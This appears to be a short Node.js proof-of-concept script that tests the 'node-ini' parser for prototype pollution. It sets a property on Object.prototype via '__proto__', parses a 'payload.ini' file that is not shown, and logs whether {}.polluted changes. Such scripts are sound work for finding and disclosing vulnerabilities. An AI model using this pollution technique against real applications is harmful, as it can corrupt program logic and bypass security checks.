var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const ini = require('node-ini');
console.log({}.polluted);
ini.parse('./payload.ini', function (err, data) {
    console.log({}.polluted);
});